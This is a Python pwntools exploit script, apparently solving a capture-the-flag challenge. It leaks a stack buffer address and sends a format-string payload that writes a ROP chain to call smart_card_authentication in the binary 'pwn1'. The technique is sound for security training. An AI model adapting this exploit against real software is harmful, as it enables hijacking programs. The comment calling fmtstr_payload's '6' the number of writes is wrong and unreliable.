#!/usr/bin/env python3
import pwn  # keep aliased as 'pwn' to show source of each function

# === Setup binary context ===
relative_binary_path = './bin/pwn1'
pwn.context.binary = relative_binary_path # We can use pwntools to find and set the correct context
elf = pwn.ELF(relative_binary_path) # We can use pwntools to load the binary and access its symbols

# === Phase 1: Analyze memory layout ===
# Launch the binary under GDB with API access to inspect memory state
pwnd_process = pwn.gdb.debug(pwn.context.binary.path, api=True)
gdb = pwnd_process.gdb

# Break at start of the target function to inspect stack early
gdb.Breakpoint("obtain_smart_card_certificate")
gdb.continue_and_wait()

# At the breakpoint, capture the stack pointer (RSP)
ret_stack_val = int(gdb.parse_and_eval("$rsp"))
pwn.log.info(f"Stack pointer (RSP) at function entry: {hex(ret_stack_val)}")

# Continue running to the username input prompt
# This ensures the buffer is allocated and populated on the stack
gdb.execute("continue")
pwnd_process.recvuntil(b'Please enter your username:\n')

# === Phase 2: Leak the address of the input buffer ===
pwnd_process.sendline(b'HINT')  # Trigger leak from binary's printf call
leak_line = pwnd_process.recvline_contains(b'Username stored at ')
buffer_address = int(leak_line.strip().split(b' ')[-1], 16)
pwn.log.info(f"Leaked buffer address: {hex(buffer_address)}")

# Calculate the offset between the buffer and the return address
# This tells us how far to jump forward in memory to overwrite control flow
offset = ret_stack_val - buffer_address
pwn.log.info(f"Computed offset to return address: {hex(offset)}")

pwnd_process.close()
# === Phase 3: Build and deliver the exploit payload ===
# Close the current process and restart for clean exploit execution
pwnd_process = pwn.gdb.debug(pwn.context.binary.path, api=True)
gdb = pwnd_process.gdb
# gdb.Breakpoint("*obtain_smart_card_certificate+573")  # Set breakpoint again if you want to walk through
gdb.continue_nowait()  # Let program run until input prompt again

# Setup ROP gadgets and target function
pop_rdi_gadget = 0x00000000004011ca              # pop rdi ; ret
authentication_func_addr = elf.symbols['smart_card_authentication']
argument_for_authentication = 0x42069

# Our location to overwrite is located buffer + offset + 8
return_address = buffer_address + offset + 8

# Build the format string payload to write a ROP chain
# The chain will:
#   1. pop argument into rdi
#   2. call smart_card_authentication(argument)
writes = {
    return_address: pop_rdi_gadget,
    return_address + 8: argument_for_authentication,
    return_address + 16: pop_rdi_gadget + 1,  # ret gadget for alignment
    return_address + 24: authentication_func_addr
}

print("Writes:")
for addr, value in writes.items():
    print(f"  {addr:#x} -> {value:#x}")

# Create the payload using fmtstr_payload
# The '6' indicates the number of writes we are making
# 'short' specifies we want to write 2-byte values (16 bits)
# This saves us from having to figure out the format strings ourselves
payload = pwn.fmtstr_payload(6, writes, write_size='short')


print(f"[+] Generated fmtstring: {payload[:78].decode()}")

# Deliver the payload
# gdb.interrupt_and_wait()
print("[+] Sending exploit payload...")
pwnd_process.sendline(payload)
# Eat up the garbage that is about to come back out from printing the buffer
pwnd_process.recvline()
pwnd_process.recvline()
pwnd_process.recvline()
# Keep the process open so we can see the flag
pwnd_process.interactive()
